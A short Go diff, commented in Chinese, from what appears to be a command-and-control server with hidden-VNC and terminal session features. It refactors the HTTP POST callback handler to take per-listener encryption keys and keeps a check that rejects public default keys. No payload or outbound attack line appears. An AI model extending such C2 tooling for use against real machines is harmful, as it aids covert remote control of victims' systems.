@@ -16,7 +16,13 @@ var BroadcastToXTermSessions func(uid string, data []byte)
 // HVNC会话广播函数，由api包在初始化时设置
 var BroadcastToHVNCSessions func(uid, sid string, frame []byte)
 
+// PostHttp POST 回传入口（未显式提供监听器密钥时按类型兜底，保持旧行为）。
 func PostHttp(w http.ResponseWriter, r *http.Request) {
+	PostHttpWithKeys(w, r, nil, nil)
+}
+
+// PostHttpWithKeys 带本监听器密钥的 POST 回传入口，与 GetHttpWithKeys 对称。
+func PostHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) {
 	encryptMetainfo := extractMetadata(r)
 
 	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
@@ -37,7 +43,7 @@ func PostHttp(w http.ResponseWriter, r *http.Request) {
 	if r.TLS != nil {
 		listenerType = "https"
 	}
-	metaMK, metaSalt := encrypt.GetListenerKeyConfig(listenerType)
+	metaMK, metaSalt := listenerKeys(vkey, salt, listenerType)
 	// J4: 拒绝公开默认密钥连接（与 GetHttp 对齐，两通道防护一致）
 	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 		logx.Warnf("⚠️ [HTTP-POST] 监听器使用公开默认密钥，拒绝连接\n")
